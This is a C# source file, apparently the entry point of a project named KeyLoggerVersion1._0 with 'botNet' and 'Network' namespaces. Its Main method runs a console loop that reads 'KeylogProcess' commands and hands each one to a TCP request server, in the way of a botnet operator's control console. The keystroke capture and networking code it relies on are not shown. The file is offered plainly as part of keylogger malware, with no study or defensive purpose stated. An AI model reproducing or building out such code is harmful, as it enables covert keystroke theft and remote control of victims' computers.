using KeyLoggerVersion1._0.botNet;
using KeyLoggerVersion1._0.Network;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyLoggerVersion1._0
{
    public class Program
    {
        #region Main

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string script = "";
            do
            {
                Console.WriteLine();
                Console.Write("KeylogProcess: "); script = Console.ReadLine();
                TCPAcceptRequest.Instance.AcceptRequestServer(script);
            }
            while (script != "exit");

            Console.ReadKey();
        }

        #endregion Main
    }
}